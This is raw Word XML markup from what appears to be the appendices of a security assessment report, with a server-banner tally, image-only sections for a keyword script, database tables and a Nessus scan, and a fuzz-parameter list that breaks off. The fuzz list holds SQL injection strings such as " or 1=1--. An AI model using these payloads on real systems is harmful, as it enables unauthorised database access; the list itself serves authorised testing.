        <w:t>0  0.00</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="6B878D38" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Linksys BEFSR41/BEFSR11/BEFSRU31: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>0  0.00</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="4A417F20" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Ubicom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/1.1: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>0  0.00</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="4DB6CA1D" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MailEnable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">-HTTP/5.0: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>0  0.00</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="78748C0E" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Ubicom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/1.1 802.11b: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>0  0.00</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2A2DE6E7" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="auto"/>
        </w:pBdr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E000276" w14:textId="77777777" w:rsidR="00E248A4" w:rsidRDefault="00E248A4" w:rsidP="00E248A4">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="61" w:name="_Toc531104381"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Appendix E – Keyword Bash Script</w:t>
      </w:r>
      <w:bookmarkEnd w:id="61"/>
    </w:p>
    <w:p w14:paraId="216B3AD7" w14:textId="53A574B9" w:rsidR="00684FC8" w:rsidRDefault="00684FC8" w:rsidP="00684FC8">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0BEF8530" wp14:editId="7ED54C2A">
            <wp:extent cx="5943600" cy="36233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623310"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="29B315C4" w14:textId="0849A1A0" w:rsidR="00A00353" w:rsidRDefault="00A00353" w:rsidP="00F519AD">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="62" w:name="_Toc531104382"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Appen</w:t>
      </w:r>
      <w:r w:rsidR="00B14C2C">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">dix F – </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B14C2C">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Som</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>stor</w:t>
      </w:r>
      <w:r w:rsidR="00B14C2C">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0084535E">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>at</w:t>
      </w:r>
      <w:r w:rsidR="0084535E">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">base </w:t>
      </w:r>
      <w:r w:rsidR="0084535E">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Tables</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DDE242A" w14:textId="4B314267" w:rsidR="00A00353" w:rsidRDefault="00A00353" w:rsidP="00A00353">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3BCD50AB" w14:textId="070ECFE1" w:rsidR="00A00353" w:rsidRDefault="00A00353" w:rsidP="00A00353">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="40BC8DA1" wp14:editId="1C922F35">
            <wp:extent cx="2943225" cy="19621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43225" cy="1962150"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E49AB7A" w14:textId="4587FFA6" w:rsidR="00A00353" w:rsidRDefault="00A00353" w:rsidP="00A00353">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="05F9BCF3" wp14:editId="58D272D1">
            <wp:extent cx="3048000" cy="3352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48000" cy="3352800"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D67580D" w14:textId="28458C0A" w:rsidR="00A00353" w:rsidRDefault="00A00353" w:rsidP="00A00353">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="21F9B374" wp14:editId="036623F7">
            <wp:extent cx="3429000" cy="2505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29000" cy="2505075"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F1A2644" w14:textId="78A2C8BB" w:rsidR="00A00353" w:rsidRDefault="00A00353" w:rsidP="00A00353">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="370366FD" wp14:editId="1892CA42">
            <wp:extent cx="2781300" cy="26193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1300" cy="2619375"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="17FBB389" w14:textId="400E3157" w:rsidR="00A00353" w:rsidRDefault="00A00353" w:rsidP="00A00353">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6CA5B465" wp14:editId="2C067CA1">
            <wp:extent cx="2647950" cy="2057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47950" cy="2057400"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B87B90F" w14:textId="35C57FF0" w:rsidR="00A00353" w:rsidRDefault="00A00353" w:rsidP="00A00353">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="44DDAC4C" wp14:editId="0727AB37">
            <wp:extent cx="3171825" cy="33147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71825" cy="3314700"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="74C9FD9D" w14:textId="58E9DEFC" w:rsidR="00A00353" w:rsidRDefault="00A00353" w:rsidP="00A00353">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="15D5D428" wp14:editId="4738C764">
            <wp:extent cx="3457575" cy="40386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57575" cy="4038600"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F1C4855" w14:textId="0F3755D6" w:rsidR="00A00353" w:rsidRDefault="00A00353" w:rsidP="00A00353">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="38D36526" wp14:editId="20DC3035">
            <wp:extent cx="3286125" cy="24955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86125" cy="2495550"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="58E4B38E" w14:textId="4362E546" w:rsidR="00A00353" w:rsidRDefault="00A00353" w:rsidP="00A00353">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2A4F85E4" wp14:editId="47D0440F">
            <wp:extent cx="2838450" cy="28003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38450" cy="2800350"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="44029395" w14:textId="08F72404" w:rsidR="00A00353" w:rsidRDefault="00A00353" w:rsidP="00A00353">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="48520B61" wp14:editId="0E8B5172">
            <wp:extent cx="2762250" cy="19431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62250" cy="1943100"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C2D6BB9" w14:textId="55BB8E47" w:rsidR="00A00353" w:rsidRDefault="00A00353" w:rsidP="00A00353">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="735C851C" wp14:editId="3F6B6E52">
            <wp:extent cx="2933700" cy="2143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33700" cy="2143125"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="174E1236" w14:textId="6F48E1AB" w:rsidR="00A00353" w:rsidRDefault="00A00353" w:rsidP="00A00353">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5281F8C6" wp14:editId="5F319A9F">
            <wp:extent cx="2838450" cy="22193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38450" cy="2219325"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A064EC9" w14:textId="35E5BD71" w:rsidR="00A00353" w:rsidRDefault="00A00353" w:rsidP="00A00353">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="48834E5C" wp14:editId="7061F177">
            <wp:extent cx="3076575" cy="24288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76575" cy="2428875"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="49A179FB" w14:textId="4C8F1EC1" w:rsidR="00A00353" w:rsidRDefault="00A00353" w:rsidP="00A00353">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="67066FC0" wp14:editId="7CF9FA74">
            <wp:extent cx="2905125" cy="2428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05125" cy="2428875"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="299BA12A" w14:textId="73D1E4C2" w:rsidR="00A00353" w:rsidRDefault="00A00353" w:rsidP="00A00353">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="69603E6C" wp14:editId="2C479B10">
            <wp:extent cx="3028950" cy="3105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28950" cy="3105150"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00065B79">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>sq</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="033E9BBC" w14:textId="530940D2" w:rsidR="00A00353" w:rsidRPr="00A00353" w:rsidRDefault="00A00353" w:rsidP="00A00353">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2508888A" wp14:editId="536ADE37">
            <wp:extent cx="3314700" cy="21145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14700" cy="2114550"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D7BC942" w14:textId="4CE1F18E" w:rsidR="00F519AD" w:rsidRDefault="00A00353" w:rsidP="00F519AD">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Appendix G</w:t>
      </w:r>
      <w:r w:rsidR="00F519AD">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> – Nessus Scan</w:t>
      </w:r>
      <w:bookmarkEnd w:id="62"/>
    </w:p>
    <w:p w14:paraId="5C99F10A" w14:textId="43B789A9" w:rsidR="00F519AD" w:rsidRDefault="00F519AD" w:rsidP="00F519AD">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2AD5D861" wp14:editId="33018B95">
            <wp:extent cx="6429375" cy="308829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44103" cy="3095373"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7328EDF6" w14:textId="0239C6AC" w:rsidR="00F519AD" w:rsidRDefault="00F519AD" w:rsidP="00F519AD">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="060B11DE" wp14:editId="6D5E868D">
            <wp:extent cx="5943600" cy="8318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831850"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D87639C" w14:textId="56F0DBF5" w:rsidR="00767C91" w:rsidRDefault="00A00353" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="63" w:name="_Toc531104383"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Appendix H</w:t>
      </w:r>
      <w:r w:rsidR="00767C91">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> – Fuzz parameters</w:t>
      </w:r>
      <w:bookmarkEnd w:id="63"/>
    </w:p>
    <w:p w14:paraId="2D720F1C" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BBA6DB5" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>!'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A0F65A4" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>!@#$%%^#$%#$@#$%$$@#$%^^**(()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BBAF07D" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>!@</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>#0%^#0##018387@#0^^**(()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DA8AFD2" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B6DDEE8" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>" or "a"="a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="710D5F64" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>" or "x"="x</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29117BF0" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>" or 0=0 #</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ECC5C5D" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>" or 0=0 --</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21001BC7" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>" or 1=1 or ""="</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C36596B" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>" or 1=1--</w:t>
      </w:r>
